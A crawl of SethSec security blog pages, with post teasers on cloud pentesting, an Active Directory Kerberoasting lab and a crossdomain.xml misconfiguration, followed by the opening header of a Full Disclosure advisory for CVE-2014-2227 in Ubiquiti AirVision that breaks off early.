    - [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)
    - [Real world exploitation of a misconfigured crossdo...](https://sethsec.blogspot.com/2014/07/crossdomain-bing.html)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from sethsec.blogspot.com_01389499_20250126_104319.html ===

[Skip to main content](#main)

### Search This Blog

# SethSec

### Pages

* [Home](https://sethsec.blogspot.com/)
* [About](https://sethsec.blogspot.com/p/about.html)

More…

## Posts

### [Cloud penetration testing: Not your typical internal penetration test](https://sethsec.blogspot.com/2022/12/cloud-penetration-testing-not-your.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[December 15, 2022](https://sethsec.blogspot.com/2022/12/cloud-penetration-testing-not-your.html "permanent link")

![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXV7zzj2x4zFuTNn8sU7Ga8kebQweNcDEMYedfrPMI3UNaOQ1NeC1oiXCfDonCK6sqHk5hdHnoNSpYFX2RFsIbzdR2fqj1hqlM_nypfF91QlE3wsnlOirJ5IDzVd1XjynglKLzjzfhlqIrqL6h9WDzVlJQaBD4KiiN60EhT73uO8Yi-FbQKJ3LyuWtew/w640-h370/Screenshot%202022-12-15%20at%207.22.06%20PM.png)

There seems to be a common path for experienced penetration testers who are thrown into the world of cloud penetration testing. I'm talking about internal (aka assumed breach) tests, where the goal is to demonstrate the impact of a compromised user with access to the cloud or a compromised application in the cloud.  The path usually starts with ignorance, is followed by total confusion and questioning everything you know about penetration testing, and ends with… well, it never ends. Why? Because the cloud providers and the cloud native technologies running in these clouds keep evolving at a remarkable rate. There's always more to learn and more attack paths waiting to be found. I hope walking through my own path and defining the stages of ignorance and awareness I encountered in a playful way might help others progress through the early stages more quickly than I did.  Level 1: This is just like any other Internal Penetration Test, right? You connect to your assumed breach sta...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/6952039514142738037)

[Read more](https://sethsec.blogspot.com/2022/12/cloud-penetration-testing-not-your.html "Cloud penetration testing: Not your typical internal penetration test")

### [Pentest Home Lab - 0x3 - Kerberoasting: Creating SPNs so you can roast them](https://sethsec.blogspot.com/2017/08/pentest-home-lab-0x3-kerberoasting.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[August 31, 2017](https://sethsec.blogspot.com/2017/08/pentest-home-lab-0x3-kerberoasting.html "permanent link")

![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJbnLzE38TrvpQWfBubPa9Lwav7WbL0h7xyveMYxiOZMLfzI05aDiWhnsuDIIErvfkNO1D_FvXcTQBd3BIG1FX7-qQp9dRcdLujiaaFGc4Zj05CcK1wEIUYRY3sO51-nnnnYTfSVS3XuqF/s640/1.png)

TL;DR There are a lot of great blogs out there that show you how to Kerberoast.  In this post, I'm going to walk through the process of setting up your lab so that you can practice this attack.  This involves creating a domain user and then mapping a SPN to that account. After that, I'll walk through using Empire to launch Invoke-Kerberoast, and I'll crack the hashes offline with Hashcat. Pentest Home Lab Recap If you don't already have an Active Directory lab and want to build one so that you can play along, check out my previous posts: Pentest Home Lab - 0x0 - Building A Virtual Corporate Domain   Pentest Home Lab - 0x1 - Building Your AD Lab on AWS Pentest Home Lab - 0x2 - Building Your AD Lab on Premises using Proxmox VE The Attack: Kerberoasting Attack Goals Domain privesc & lateral movement.  If you have domain credentials and access to the domain, this is a relatively easy way to gain additional access within the domain. If all goes well, ...

[2 comments](https://www.blogger.com/comment/fullpage/post/5890567984672491244/5235963048713454222)

[Read more](https://sethsec.blogspot.com/2017/08/pentest-home-lab-0x3-kerberoasting.html "Pentest Home Lab - 0x3 - Kerberoasting: Creating SPNs so you can roast them")

### [Pentest Home Lab - 0x2 - Building Your AD Lab on Premises](https://sethsec.blogspot.com/2017/06/pentest-home-lab-0x2-building-your-ad.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[June 06, 2017](https://sethsec.blogspot.com/2017/06/pentest-home-lab-0x2-building-your-ad.html "permanent link")

![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKtUVhTbMjKrKcMQf-U_6PYkFaybTwMJGFRBr7MPQcmCK53xKH783CXpVhMDxI19Lt_QLB1fT3iVbkpdc8KU_65tWT2TB2JePRLDKDkNaIjmBULq-D2rYmIDtSxS1zOhA-b6d4uQydEqMJ/s320/proxmox+lab.png)

In Pentest Home Lab - 0x0 - Building a virtual corporate domain , we talked about why you would want to build your own AD pentest lab, where you can build it, and the pros and cons of each option. In Pentest Home Lab - 0x1 - Building Your AD Lab on AWS , we walked through setting up a fully functional home lab in AWS. In this third installment, I'm going to walk through setting up a pentest active directory home lab in your basement, closet, etc.  I'll be using Proxmox VE, an open source virtualization environment (aka hypervisor) similar to Vmware ESXi or Citrix XEN. The series so far: Pentest Home Lab - 0x0 - Building A Virtual Corporate Domain  (This post) Pentest Home Lab - 0x1 - Building Your AD Lab on AWS Pentest Home Lab - 0x2 - Building Your AD Lab on Premises using Proxmox VE Pentest Home Lab - 0x3 - Kerberoasting: Creating SPNs so you can roast them Table of Contents What are we going to build? Example server specs Let's talk about networ...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/5572897998817688667)

[Read more](https://sethsec.blogspot.com/2017/06/pentest-home-lab-0x2-building-your-ad.html "Pentest Home Lab - 0x2 - Building Your AD Lab on Premises")

### [Pentest Home Lab - 0x1 - Building Your AD Lab on AWS](https://sethsec.blogspot.com/2017/05/pentest-home-lab-0x1-building-your-ad.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[May 04, 2017](https://sethsec.blogspot.com/2017/05/pentest-home-lab-0x1-building-your-ad.html "permanent link")

![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-AgOHrxFCIzpFHXNWqfONBSU0aQ6UyslkbXIfiwzA5Ua496Lo8kPmLlSRF9u5hb6TnMljnDeFa28jlczzKiZ-wdOHHnV-KY4PQ1WSOIWm6vWCA87yc5RfAhxgGWulrWfy6DLiebNJi6Zd/s400/instances2.png)

In Pentest Home Lab - 0x0 - Building a virtual corporate domain , we talked about why you would want to build your own AD pentest lab, where you can build it (cloud vs on-premises options), and the pros and cons of each option. This post covers building your lab on AWS. Even if you have a lab at home, setting up a small second home lab on AWS is a worthwhile exercise. You'll learn a lot about AWS in the process. The series so far: Pentest Home Lab - 0x0 - Building A Virtual Corporate Domain  (This post) Pentest Home Lab - 0x1 - Building Your AD Lab on AWS Pentest Home Lab - 0x2 - Building Your AD Lab on Premises using Proxmox VE Pentest Home Lab - 0x3 - Kerberoasting: Creating SPNs so you can roast them Table of Contents What are we going to build? Creating your AWS instances Instance #1: This will be the Domain Controller Instance #2: This will be Workstation01  Disable IE Enhanced Security Configuration Instances #3 & #4 (Optional) Creat...

[7 comments](https://www.blogger.com/comment/fullpage/post/5890567984672491244/4883092951267939929)

[Read more](https://sethsec.blogspot.com/2017/05/pentest-home-lab-0x1-building-your-ad.html "Pentest Home Lab - 0x1 - Building Your AD Lab on AWS")

[More posts](https://sethsec.blogspot.com/search?updated-max=2017-05-04T17:32:00-04:00&max-results=7 "More posts")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

    - [Cloud penetration testing: Not your typical intern...](https://sethsec.blogspot.com/2022/12/cloud-penetration-testing-not-your.html)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from sethsec.blogspot.com_605c43e2_20250126_104321.html ===

[Skip to main content](#main)

### Search This Blog

# [SethSec](https://sethsec.blogspot.com/)

### Pages

* [Home](https://sethsec.blogspot.com/)
* [About](https://sethsec.blogspot.com/p/about.html)

More…

## Posts

Showing posts from November, 2014

[Show all](https://sethsec.blogspot.com/)

### [Crossdomain.xml can be overly permissive even without a wildcard (\*)](https://sethsec.blogspot.com/2014/11/crossdomainxml-can-be-overly-permissive_18.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[November 18, 2014](https://sethsec.blogspot.com/2014/11/crossdomainxml-can-be-overly-permissive_18.html "permanent link")

![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjU1PxJlRzrIGqQxlflEbTillZ37YcOUZp_EH4_Yb-zHTwpxcxCXHzfuY-FQOIGo5XJcikYSfLNbmbUoxbLVrFpSv8e8sU5w42Bwf73nvoPr7fW28X6xgAGQTHxg-Q3eVI6oDGa9eS42G70/s1600/pasted-image-4730.png)

Before too much time passes, I want to write about a point I covered in my presentation that is not widely covered on the web -- or maybe not even covered at all. The main point is that even if you have a very specific list of domains that you trust, you may still be vulnerable to CWE-942 , if one of the domains that you trust is available for purchase. To illustrate this point in my talk, I used the crossdomain.xml file at www.sears.com: What I found in my research is that there are plenty of crossdomain.xml files that trust sites that are available for purchase.   As far as I know, every single security assessment tool out there would pass right over these sites, missing the fact that a vulnerable configuration could be in place. In the case of www.sears.com, they are trusting the domain: searstestsite.com. For the purpose of demonstrating the vulnerability, I purchased this domain. This means that I can now host a malicious SWF at www.searstestsite.com, a domain that...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/2178001255502806715)

[Read more](https://sethsec.blogspot.com/2014/11/crossdomainxml-can-be-overly-permissive_18.html "Crossdomain.xml can be overly permissive even without a wildcard (*)")

[More posts](https://sethsec.blogspot.com/search?updated-max=2014-11-18T16:48:00-05:00&max-results=7 "More posts")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)

    - [Crossdomain.xml can be overly permissive even with...](https://sethsec.blogspot.com/2014/11/crossdomainxml-can-be-overly-permissive_18.html)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from seclists.org_0cdb5a1e_20250125_174737.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](127)
[By Date](date.html#128)
[![Next](/images/right-icon-16x16.png)](129)

[![Previous](/images/left-icon-16x16.png)](127)
[By Thread](index.html#128)
[![Next](/images/right-icon-16x16.png)](130)

![](/shared/images/nst-icons.svg#search)

# CVE-2014-2227: Ubiquiti Networks - AirVision v2.1.3 - Overly Permissive default crossdomain.xml

---

*From*: Seth Art <sethsec () gmail com>

*Date*: Thu, 24 Jul 2014 00:01:11 -0400

---

```
-----------
Vendor:
-----------
Ubiquiti Networks (<http://www.ubnt.com/>)

----------------------------------------------
Affected Products/Versions:
----------------------------------------------
AirVision Controller v2.1.3
Note: Previous versions may be affected

-----------------
Description:
-----------------
Title: Overly Permissive default crossdomain.xml file
CVE: CVE-2014-2227
CWE: <http://cwe.mitre.org/data/definitions/264.html>
Detailed writeup: <http://sethsec.blogspot.com/2014/07/cve-2014-2227.html>
Researcher: Seth Art - @sethsec

------------------------------------------------------------------------------------------------------
